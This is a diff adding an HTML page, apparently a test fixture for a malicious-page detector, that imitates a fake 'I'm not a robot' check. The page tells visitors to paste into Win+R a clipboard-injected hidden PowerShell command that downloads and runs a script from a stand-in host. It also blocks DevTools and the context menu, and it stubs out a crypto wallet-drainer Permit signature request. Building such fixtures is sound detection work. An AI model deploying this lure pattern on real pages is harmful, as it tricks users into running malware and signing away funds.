@@ -1,0 +1,28 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Verify you are human</title></head>
+<body>
+<h2>Security Check - I'm not a robot</h2>
+<p>Press Win+R, paste with Ctrl+V and press Enter.</p>
+<script>
+  // Benign fixture exercising the runner hooks. Clipboard write with no user gesture.
+  var cmd = 'powershell -w hidden -c "iwr http://payload.example.invalid/x.ps1 | iex"';
+  if (navigator.clipboard) { navigator.clipboard.writeText(cmd).catch(function () {}); }
+  // Block DevTools shortcuts and the context menu (DE-EVA-001).
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'F12' || (e.ctrlKey && (e.key === 'u' || e.key === 'U'))) e.preventDefault();
+  });
+  document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
+  // Fake wallet drainer flow (only observable when the fake wallet is injected).
+  async function drain() {
+    if (!window.ethereum) return;
+    try { await window.ethereum.request({ method: 'eth_requestAccounts' }); } catch (e) {}
+    try {
+      await window.ethereum.request({
+        method: 'eth_signTypedData_v4',
+        params: ['0x0', JSON.stringify({ primaryType: 'Permit', domain: {}, message: {} })],
+      });
+    } catch (e) {}
+  }
+  drain();
+</script>
+</body></html>
